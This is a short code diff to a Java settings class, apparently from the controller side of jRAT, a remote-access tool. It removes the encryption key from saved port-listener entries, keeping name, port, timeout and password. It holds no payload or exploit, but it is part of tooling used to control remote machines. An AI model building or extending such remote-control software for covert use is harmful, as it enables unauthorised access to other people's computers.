@@ -2,7 +2,6 @@ package io.jrat.client.settings;
 
 import io.jrat.client.io.Files;
 import io.jrat.client.net.PortListener;
-import io.jrat.common.crypto.EncryptionKey;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -44,7 +43,7 @@ public class Sockets extends AbstractSettings implements Serializable {
 
 		for (int i = 0; i < PortListener.listeners.size(); i++) {
 			PortListener connection = PortListener.listeners.get(i);
-			SocketEntry save = new SocketEntry(connection.getName(), connection.getServer().getLocalPort(), connection.getTimeout(), connection.getKey().getTextualKey(), connection.getPass());
+			SocketEntry save = new SocketEntry(connection.getName(), connection.getServer().getLocalPort(), connection.getTimeout(), connection.getPass());
 			list.add(save);
 		}
 
@@ -57,22 +56,16 @@ public class Sockets extends AbstractSettings implements Serializable {
 
 		private static final long serialVersionUID = -2000514812654090252L;
 
-		private String key;
 		private String pass;
 		private int timeout;
 		private int port;
 		private String name;
 
-		public SocketEntry(String name, int port, int timeout, String key, String pass) {
+		public SocketEntry(String name, int port, int timeout, String pass) {
 			this.name = name;
 			this.port = port;
 			this.timeout = timeout;
-			this.key = key;
 			this.pass = pass;
-		}
-
-		public String getKey() {
-			return key;
 		}
 
 		public String getPass() {
@@ -93,7 +86,7 @@ public class Sockets extends AbstractSettings implements Serializable {
 
 		public void start() {
 			try {
-				PortListener connection = new PortListener(name, port, timeout, new EncryptionKey(key), pass);
+				PortListener connection = new PortListener(name, port, timeout, pass);
 				connection.start();
 			} catch (Exception e) {
 				e.printStackTrace();
